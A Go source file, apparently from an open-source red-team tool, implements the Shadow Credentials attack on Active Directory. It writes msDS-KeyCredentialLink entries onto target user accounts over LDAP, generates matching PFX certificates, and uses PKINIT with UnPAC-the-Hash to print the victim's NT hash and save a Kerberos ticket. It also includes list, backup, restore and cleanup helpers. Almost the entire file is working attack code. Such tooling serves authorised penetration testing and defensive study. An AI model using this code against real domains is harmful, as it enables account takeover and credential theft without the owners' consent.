package main

import (
	"context"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/RedTeamPentesting/adauth"
	"github.com/RedTeamPentesting/adauth/ccachetools"
	"github.com/RedTeamPentesting/adauth/pkinit"
	"github.com/RedTeamPentesting/keycred"
	"software.sslmate.com/src/go-pkcs12"

	"github.com/go-ldap/ldap/v3"
	"github.com/google/uuid"
)

func authenticate(ctx context.Context, creds *adauth.Credential, socksServer string) error {
	if creds.ClientCert == nil {
		return fmt.Errorf("specify a client certificate")
	}

	krbConf, err := creds.KerberosConfig(ctx)
	if err != nil {
		return fmt.Errorf("configure Kerberos: %w", err)
	}

	rsaKey, ok := creds.ClientCertKey.(*rsa.PrivateKey)
	if !ok {
		return fmt.Errorf("cannot use %T because PKINIT requires an RSA key", creds.ClientCertKey)
	}

	ccache, hash, err := pkinit.UnPACTheHash(
		ctx, creds.Username, creds.Domain, creds.ClientCert, rsaKey, krbConf,
		pkinit.WithDialer(adauth.DialerWithSOCKS5ProxyIfSet(socksServer, nil)))
	if err != nil {
		return fmt.Errorf("UnPAC-the-Hash: %w", err)
	}

	fmt.Printf("%s: %s\n", creds.LogonName(), hash.Combined())

	ccacheFile, err := findUnusedFilename(creds.UPN(), ".ccache")
	if err != nil {
		return fmt.Errorf("find unused filename for CCache: %w", err)
	}

	ccacheBytes, err := ccachetools.MarshalCCache(ccache)
	if err != nil {
		return fmt.Errorf("marshal CCache: %w", err)
	}

	err = os.WriteFile(ccacheFile, ccacheBytes, 0o600)
	if err != nil {
		return fmt.Errorf("write CCache: %w", err)
	}

	creds.CCache = ccacheFile

	fmt.Println("Ticket saved in", ccacheFile)

	return nil
}

func addKeyCredential(
	conn *ldap.Conn, username string, keySize int, deviceID string,
	derFormatted bool, stdout bool, saveLocation string, pfxPassword string,
) error {
	var deviceGUID *uuid.UUID

	if deviceID != "" {
		id, err := uuid.Parse(deviceID)
		if err != nil {
			return fmt.Errorf("parse device ID: %w", err)
		}

		deviceGUID = &id
	}

	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	userDN, err := queryAttributeValueByIdentifier(conn, baseDN, username, "distinguishedName")
	if err != nil {
		return fmt.Errorf("query user DN: %w", err)
	}

	subject, err := queryAttributeValueByIdentifier(conn, baseDN, username, "sAMAccountName")
	if err != nil {
		return fmt.Errorf("query user samAccountName: %w", err)
	} else if subject == "" {
		return fmt.Errorf("could not obtain sAMAccountName for subject")
	}

	otherName, err := upnFromSAMAccountNameAndBaseDN(subject, baseDN)
	if err != nil {
		return fmt.Errorf("build UPN: %w", err)
	}

	additionalEntries := []keycred.KeyCredentialLinkEntry{
		keycred.NewKeySourceEntry(keycred.KeySourceAD),
	}

	if deviceGUID != nil {
		additionalEntries = append(additionalEntries, keycred.NewDeviceIDEntry(*deviceGUID))
	}

	additionalEntries = append(
		additionalEntries,
		keycred.NewCustomKeyInformationEntry(
			&keycred.CustomKeyInformation{
				Version: 1,
				Flags:   keycred.CustomKeyInformationFlagsMFANotUsed,
			},
		),
		keycred.NewKeyCreationTimeEntry(time.Now()),
	)

	cred, err := keycred.GeneratePFXAndCustomKeyCredentialLink(
		keySize, subject, userDN, otherName, derFormatted, pfxPassword, additionalEntries...)
	if err != nil {
		return fmt.Errorf("generate PFX and KeyCredentialLink: %w", err)
	}

	modReq := ldap.NewModifyRequest(userDN, nil)
	modReq.Add("msDS-KeyCredentialLink", []string{cred.KeyCredentialLink.DNWithBinary()})

	err = conn.Modify(modReq)
	if err != nil {
		return fmt.Errorf("append KeyCredentialLink: %w", err)
	}

	fmt.Printf("Created KeyCredentialLink for %s:\n\n%s\n\n", username, cred.KeyCredentialLink.ColoredString())

	if stdout {
		fmt.Printf("PFX:\n%s\n", base64.StdEncoding.EncodeToString(cred.PFX))

		return nil
	}

	if saveLocation == "" {
		saveLocation = "."
	}

	s, err := os.Stat(saveLocation)
	if err == nil && s.IsDir() {
		cleanedUser := strings.ReplaceAll(strings.ReplaceAll(username, "\\", "_"), "/", "_")
		baseName := filepath.Join(saveLocation, cleanedUser)

		outputFileName, err := findUnusedFilename(baseName, ".pfx")
		if err != nil {
			fmt.Printf("Recovering PFX:\n%s\n", base64.StdEncoding.EncodeToString(cred.PFX))

			return fmt.Errorf("finding output file name: %w", err)
		}

		saveLocation = filepath.Join(saveLocation, outputFileName)
	}

	err = os.WriteFile(saveLocation, cred.PFX, 0o600)
	if err != nil {
		fmt.Printf("Recovering PFX:\n%s\n", base64.StdEncoding.EncodeToString(cred.PFX))

		return fmt.Errorf("saving PFX: %w", err)
	}

	fmt.Printf("Saved PFX at %s\n", saveLocation)

	return nil
}

func registerKeyCredential(
	conn *ldap.Conn, username string, deviceID string,
	derFormatted bool, pfxFile string, password string,
) error {
	pfxData, err := os.ReadFile(pfxFile)
	if err != nil {
		return fmt.Errorf("read PFX: %w", err)
	}

	rawKey, _, _, err := pkcs12.DecodeChain(pfxData, password)
	if err != nil {
		return fmt.Errorf("decode PFX: %w", err)
	}

	privKey, ok := rawKey.(*rsa.PrivateKey)
	if !ok {
		return fmt.Errorf("key is an %T key instead of an RSA key",
			strings.ToUpper(
				strings.TrimPrefix(
					strings.TrimSuffix(fmt.Sprintf("%T", rawKey), ".PrivateKey"),
					"*")))
	}

	var deviceGUID *uuid.UUID

	if deviceID != "" {
		id, err := uuid.Parse(deviceID)
		if err != nil {
			return fmt.Errorf("parse device ID: %w", err)
		}

		deviceGUID = &id
	}

	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	userDN, err := queryAttributeValueByIdentifier(conn, baseDN, username, "distinguishedName")
	if err != nil {
		return fmt.Errorf("query user DN: %w", err)
	}

	subject, err := queryAttributeValueByIdentifier(conn, baseDN, username, "sAMAccountName")
	if err != nil {
		return fmt.Errorf("query user samAccountName: %w", err)
	} else if subject == "" {
		return fmt.Errorf("could not obtain sAMAccountName for subject")
	}

	additionalEntries := []keycred.KeyCredentialLinkEntry{
		keycred.NewKeySourceEntry(keycred.KeySourceAD),
	}

	if deviceGUID != nil {
		additionalEntries = append(additionalEntries, keycred.NewDeviceIDEntry(*deviceGUID))
	}

	additionalEntries = append(
		additionalEntries,
		keycred.NewCustomKeyInformationEntry(
			&keycred.CustomKeyInformation{
				Version: 1,
				Flags:   keycred.CustomKeyInformationFlagsMFANotUsed,
			},
		),
		keycred.NewKeyCreationTimeEntry(time.Now()),
	)

	var kcl *keycred.KeyCredentialLink

	if derFormatted {
		kcl, err = keycred.NewDERKeyCredentialLink(&privKey.PublicKey, userDN, keycred.KeyUsageNGC, additionalEntries...)
	} else {
		kcl, err = keycred.NewKeyCredentialLink(&privKey.PublicKey, userDN, keycred.KeyUsageNGC, additionalEntries...)
	}

	if err != nil {
		return fmt.Errorf("generate KeyCredentialLink: %w", err)
	}

	modReq := ldap.NewModifyRequest(userDN, nil)
	modReq.Add("msDS-KeyCredentialLink", []string{kcl.DNWithBinary()})

	err = conn.Modify(modReq)
	if err != nil {
		return fmt.Errorf("append KeyCredentialLink: %w", err)
	}

	fmt.Printf("Created KeyCredentialLink for %s:\n\n%s\n\n", username, kcl.ColoredString())

	return nil
}

func findUnusedFilename(baseName string, extension string) (string, error) {
	_, err := os.Stat(baseName + extension)
	if errors.Is(err, os.ErrNotExist) {
		return baseName + extension, nil
	}

	for i := 2; i < 200; i++ {
		name := baseName + "_" + strconv.Itoa(i) + extension

		_, err := os.Stat(name)
		if errors.Is(err, os.ErrNotExist) {
			return name, nil
		}
	}

	return "", fmt.Errorf("cannot find free output file name")
}

func addRawKeyCredential(conn *ldap.Conn, username string, dnWithBinary string, unsafe bool) error {
	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	userDN, err := queryAttributeValueByIdentifier(conn, baseDN, username, "distinguishedName")
	if err != nil {
		return fmt.Errorf("query user DN: %w", err)
	}

	parts := strings.Split(dnWithBinary, ":")
	if len(parts) != 4 {
		return fmt.Errorf("unexpected number of elements in DNWithBinary structure: %d", len(parts))
	}

	if parts[3] == "" {
		parts[3] = userDN
		fmt.Println("Added user DN:", userDN)
	}

	dnWithBinary = strings.Join(parts, ":")

	if !unsafe {
		_, err := keycred.ParseDNWithBinary(dnWithBinary)
		if err != nil {
			return fmt.Errorf("parse KeyCredentialLink: %w", err)
		}
	}

	modReq := ldap.NewModifyRequest(userDN, nil)
	modReq.Add("msDS-KeyCredentialLink", []string{dnWithBinary})

	err = conn.Modify(modReq)
	if err != nil {
		return fmt.Errorf("append KeyCredentialLink: %w", err)
	}

	fmt.Println("Added KeyCredentialLink")

	return nil
}

func listKeyCredentialsOfUser(conn *ldap.Conn, target string, includeRaw bool) error {
	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	kcls, parseErrs, err := queryKeyCredentials(conn, baseDN, target)
	if err != nil {
		return fmt.Errorf("list key credentials: %w", err)
	}

	for _, parseErr := range parseErrs {
		fmt.Fprintf(os.Stderr, "Warning: Cannot parse KeyCredentialLink %v\n", parseErr)
	}

	if len(kcls) == 0 {
		fmt.Println("No KeyCredentialLinks present")
	} else {
		fmt.Println(keycred.FormatKeyCredentials(kcls, includeRaw, true))
	}

	return nil
}

type backupFormat struct {
	BaseDN             string   `json:"base_dn"`
	UserDN             string   `json:"user_dn"`
	KeyCredentialLinks []string `json:"key_credential_links"`
}

func backupKeyCredentialsOfUser(conn *ldap.Conn, target string, filename string, self bool) error {
	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	userDN, err := queryAttributeValueByIdentifier(conn, baseDN, target, "distinguishedName")
	if err != nil {
		return fmt.Errorf("query user DN: %w", err)
	}

	samAccountName, err := queryAttributeValueByIdentifier(conn, baseDN, target, "sAMAccountName")
	if err != nil {
		return fmt.Errorf("query user DN: %w", err)
	}

	keyCreds, err := queryAttributeValues(conn, userDN, "msDS-KeyCredentialLink")
	if err != nil {
		return fmt.Errorf("query msDS-KeyCredentialLink: %w", err)
	}

	backupData, err := json.MarshalIndent(backupFormat{
		BaseDN: baseDN, UserDN: userDN, KeyCredentialLinks: keyCreds,
	}, "", "    ")
	if err != nil {
		return fmt.Errorf("marshal backup: %w", err)
	}

	fmt.Printf("Backing up %d KeyCredentials for user %s\n", len(keyCreds), target)

	if self && strings.HasSuffix(samAccountName, "$") && len(keyCreds) > 1 {
		fmt.Fprintf(os.Stderr, "\x1b[33;1mWarning: \x1b[0m\x1b[33mThe computer account will not be able "+
			"to restore the backup with %d entries itself\x1b[0m\n",
			len(keyCreds))
	}

	if filename == "" {
		cleanedUser := strings.ReplaceAll(strings.ReplaceAll(target, "\\", "_"), "/", "_")
		baseName := fmt.Sprintf("keycred_backup_%s_%s", cleanedUser, time.Now().Format("2006-01-02_15:04:05"))

		filename, err = findUnusedFilename(baseName, ".bak")
		if err != nil {
			return fmt.Errorf("find unused filename: %w", err)
		}
	}

	err = os.WriteFile(filename, backupData, 0o600)
	if err != nil {
		return fmt.Errorf("saving backup file: %w", err)
	}

	fmt.Println("Created backup:", filename)

	return nil
}

func restoreBackup(conn *ldap.Conn, backupFile string, force bool, preserveLastLogonTimeStamp bool) error {
	backupData, err := os.ReadFile(backupFile)
	if err != nil {
		return fmt.Errorf("read backup file: %w", err)
	}

	var backup backupFormat

	err = json.Unmarshal(backupData, &backup)
	if err != nil {
		return fmt.Errorf("parse backup: %w", err)
	}

	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	if !force && !strings.EqualFold(baseDN, backup.BaseDN) {
		return fmt.Errorf("base DN mismatch: %w", err)
	}

	if !preserveLastLogonTimeStamp {
		for i, keyCred := range backup.KeyCredentialLinks {
			kcl, err := keycred.ParseDNWithBinary(keyCred)
			if err != nil {
				continue
			}

			kcl.Remove(keycred.TypeKeyApproximateLastLogonTimeStamp)

			backup.KeyCredentialLinks[i] = kcl.DNWithBinary()
		}
	}

	if !force {
		for _, keyCred := range backup.KeyCredentialLinks {
			_, err := keycred.ParseDNWithBinary(keyCred)
			if err != nil {
				return fmt.Errorf("parse KeyCredential from backup: %w", err)
			}
		}
	}

	modReq := ldap.NewModifyRequest(backup.UserDN, nil)
	modReq.Replace("msDS-KeyCredentialLink", backup.KeyCredentialLinks)

	err = conn.Modify(modReq)
	if err != nil {
		return fmt.Errorf("append KeyCredentialLink: %w", err)
	}

	fmt.Println("Successfully restored backup")

	return listKeyCredentialsOfUser(conn, backup.UserDN, false)
}

func listAllKeyCredentials(conn *ldap.Conn, includeRaw bool) error {
	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	res, err := conn.SearchWithPaging(&ldap.SearchRequest{
		BaseDN:       baseDN,
		Scope:        ldap.ScopeWholeSubtree,
		DerefAliases: ldap.DerefAlways,
		Filter:       "(&(objectClass=User)(msDS-KeyCredentialLink=*))",
		Attributes:   []string{"msDS-KeyCredentialLink", "sAMAccountName", "distinguishedName", "userPrincipalName"},
		SizeLimit:    999999999,
	}, 256)
	if err != nil {
		return fmt.Errorf("query msDS-KeyCredentialLink: %w", err)
	}

	fmt.Printf("Found %d accounts with KeyCredentials\n\n", len(res.Entries))

	for i, entry := range res.Entries {
		name := entry.GetAttributeValue("userPrincipalName")
		if name == "" {
			name = entry.GetAttributeValue("sAMAccountName")
		}

		if name == "" {
			name = entry.GetAttributeValue("distinguishedName")
		}

		rawKeyCreds := entry.GetAttributeValues("msDS-KeyCredentialLink")

		fmt.Printf("%s (%d):\n", name, len(rawKeyCreds))

		var kcls []*keycred.KeyCredentialLink

		for _, rawKeyCred := range rawKeyCreds {
			kcl, err := keycred.ParseDNWithBinary(rawKeyCred)
			if err != nil {
				fmt.Fprintf(os.Stderr, "Warning: Cannot parse KeyCredentialLink %v\n", err)

				continue
			}

			kcls = append(kcls, kcl)
		}

		fmt.Println(indent(keycred.FormatKeyCredentials(kcls, includeRaw, true), "  "))

		if i < len(res.Entries)-1 {
			fmt.Println()
		}
	}

	return nil
}

func removeKeyCredential(
	conn *ldap.Conn, target string, byDeviceID string, byKeyID string, byPubKey *rsa.PublicKey,
) (err error) {
	switch {
	case byPubKey != nil:
		if byDeviceID != "" || byKeyID != "" {
			return fmt.Errorf("--key-id or --device-id are ignored when a public key is provided")
		}
	default:
		if (byDeviceID == "" && byKeyID == "") || (byDeviceID != "" && byKeyID != "") {
			return fmt.Errorf("specify either --key-id or --device-id")
		}
	}

	var deviceGUID *uuid.UUID

	if byDeviceID != "" {
		id, err := uuid.Parse(byDeviceID)
		if err != nil {
			return fmt.Errorf("parse device ID: %w", err)
		}

		deviceGUID = &id
	}

	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	userDN, err := queryAttributeValueByIdentifier(conn, baseDN, target, "distinguishedName")
	if err != nil {
		return fmt.Errorf("query user DN: %w", err)
	}

	kcls, parseErrs, err := queryKeyCredentials(conn, baseDN, target)
	if err != nil {
		return fmt.Errorf("list current key credentials: %w", err)
	}

	for _, parseErr := range parseErrs {
		fmt.Fprintf(os.Stderr, "Warning: Cannot parse KeyCredentialLink: %v\n", parseErr)
	}

	for _, kcl := range kcls {
		if deviceGUID != nil {
			idEntry, ok := kcl.Get(keycred.TypeDeviceId).(*keycred.DeviceIDEntry)
			if !ok || idEntry.GUID().String() != deviceGUID.String() {
				continue
			}
		}

		if byKeyID != "" {
			idEntry, ok := kcl.Get(keycred.TypeKeyID).(*keycred.KeyIDEntry)
			if !ok || !idEntry.MatchesString(byKeyID) {
				continue
			}
		}

		if byPubKey != nil {
			keyMaterial, ok := kcl.Get(keycred.TypeKeyMaterial).(*keycred.KeyMaterialEntry)
			if !ok || !keyMaterial.Key().Equal(byPubKey) {
				continue
			}
		}

		modReq := ldap.NewModifyRequest(userDN, nil)
		modReq.Delete("msDS-KeyCredentialLink", []string{kcl.DNWithBinary()})

		err = conn.Modify(modReq)
		if err != nil {
			return fmt.Errorf("remove KeyCredentialLink: %w", err)
		}

		fmt.Println("Successfully removed KeyCredentialLink")

		return nil
	}

	return fmt.Errorf("no matching KeyCredentialLink found")
}

func clearKeyCredential(conn *ldap.Conn, target string) error {
	baseDN, err := queryBaseDN(conn)
	if err != nil {
		return fmt.Errorf("query base DN: %w", err)
	}

	userDN, err := queryAttributeValueByIdentifier(conn, baseDN, target, "distinguishedName")
	if err != nil {
		return fmt.Errorf("query user DN: %w", err)
	}

	modReq := ldap.NewModifyRequest(userDN, nil)
	modReq.Replace("msDS-KeyCredentialLink", []string{})

	err = conn.Modify(modReq)
	if err != nil {
		return fmt.Errorf("clear KeyCredentialLink: %w", err)
	}

	fmt.Println("Removed all KeyCredentialLinks of", target)

	return nil
}

func queryKeyCredentials(
	conn *ldap.Conn, baseDN string, user string,
) (kcls []*keycred.KeyCredentialLink, parseErrs []error, err error) {
	userDN, err := queryAttributeValueByIdentifier(conn, baseDN, user, "distinguishedName")
	if err != nil {
		return nil, nil, fmt.Errorf("query user DN: %w", err)
	}

	keyCreds, err := queryAttributeValues(conn, userDN, "msDS-KeyCredentialLink")
	if err != nil {
		return nil, nil, fmt.Errorf("query msDS-KeyCredentialLink: %w", err)
	}

	for _, cred := range keyCreds {
		kcl, err := keycred.ParseDNWithBinary(cred)
		if err != nil {
			parseErrs = append(parseErrs, fmt.Errorf("parse KeyCredentialLink: %w", err))
		} else {
			kcls = append(kcls, kcl)
		}
	}

	return kcls, parseErrs, nil
}

func queryAttributeValueByIdentifier(
	conn *ldap.Conn, baseDN string, identifier string, attribute string,
) (string, error) {
	entry, err := queryObject(conn, baseDN, identifier, []string{attribute})
	if err != nil {
		return "", err
	}

	return entry.GetAttributeValue(attribute), nil
}

func queryObject(conn *ldap.Conn, baseDN string, object string, attributes []string) (*ldap.Entry, error) {
	return queryOne(conn, baseDN, filterByIdentifier(object), ldap.ScopeWholeSubtree, attributes)
}

func queryOne(conn *ldap.Conn, baseDN string, filter string, scope int, attributes []string) (*ldap.Entry, error) {
	res, err := conn.Search(&ldap.SearchRequest{
		BaseDN:     baseDN,
		Scope:      scope,
		Filter:     filter,
		Attributes: attributes,
	})
	if err != nil {
		return nil, fmt.Errorf("query: baseDN=%s, filter=%s, scope=%d, attributes=%v: %w",
			baseDN, filter, scope, attributes, err)
	}

	switch len(res.Entries) {
	case 0:
		return nil, fmt.Errorf("no search results")
	case 1:
		return res.Entries[0], nil
	default:
		return nil, fmt.Errorf("got %d search results instead of 1", len(res.Entries))
	}
}

func queryBaseDN(conn *ldap.Conn) (string, error) {
	res, err := conn.Search(&ldap.SearchRequest{
		BaseDN:     "",
		Scope:      ldap.ScopeBaseObject,
		Filter:     "(objectCategory=*)",
		Attributes: []string{"defaultNamingContext"},
	})
	if err != nil {
		return "", fmt.Errorf("query defaultNamingContext: %w", err)
	}

	for _, entry := range res.Entries {
		cnc := entry.GetAttributeValue("defaultNamingContext")
		if cnc == "" {
			return "", fmt.Errorf("configurationNamingContext is empty")
		}

		return cnc, nil //nolint:staticcheck
	}

	return "", fmt.Errorf("no search results")
}

func queryAttributeValues(conn *ldap.Conn, baseDN string, attribute string) ([]string, error) {
	entry, err := queryOne(conn, baseDN, "(&)", ldap.ScopeBaseObject, []string{attribute})
	if err != nil {
		return nil, err
	}

	return entry.GetAttributeValues(attribute), nil
}

func filterByIdentifier(filterOrSIDOrDNOrUPNorSamAccountName string) string {
	identifier := "samAccountName"
	value := filterOrSIDOrDNOrUPNorSamAccountName

	switch {
	case isSID(filterOrSIDOrDNOrUPNorSamAccountName):
		identifier = "objectSid"
	case isDN(filterOrSIDOrDNOrUPNorSamAccountName):
		identifier = "distinguishedName"
	case isUPN(filterOrSIDOrDNOrUPNorSamAccountName):
		value = strings.Split(filterOrSIDOrDNOrUPNorSamAccountName, "@")[0]
	case isSAMAccountNameWithDomain(filterOrSIDOrDNOrUPNorSamAccountName):
		value = strings.Split(filterOrSIDOrDNOrUPNorSamAccountName, `\`)[1]
	}

	return fmt.Sprintf("(%s=%s)", identifier, ldap.EscapeFilter(value))
}

var sidRE = regexp.MustCompile(`^S-1(?:-\d+)+`)

func isSID(s string) bool {
	return sidRE.MatchString(s)
}

func isDN(s string) bool {
	parts := strings.Split(s, ",")
	if len(parts) == 1 {
		return false
	}

	for _, part := range parts {
		if !strings.Contains(part, "=") {
			return false
		}
	}

	return true
}

func isUPN(s string) bool {
	return len(strings.Split(s, "@")) == 2
}

func isSAMAccountNameWithDomain(s string) bool {
	return len(strings.Split(s, `\`)) == 2
}

func indent(s string, prefix string) string {
	return prefix + strings.ReplaceAll(s, "\n", "\n"+prefix)
}

func upnFromSAMAccountNameAndBaseDN(samAccountName string, baseDN string) (string, error) {
	dn, err := ldap.ParseDN(baseDN)
	if err != nil {
		return "", fmt.Errorf("parse base DN: %w", err)
	}

	parts := make([]string, 0, len(dn.RDNs))

	for _, rdns := range dn.RDNs {
		for _, attr := range rdns.Attributes {
			if !strings.EqualFold(attr.Type, "dc") {
				return "", fmt.Errorf("encountered attribute in base DN %q: %q", baseDN, attr.Type)
			}

			parts = append(parts, attr.Value)
		}
	}

	return samAccountName + "@" + strings.Join(parts, "."), nil
}
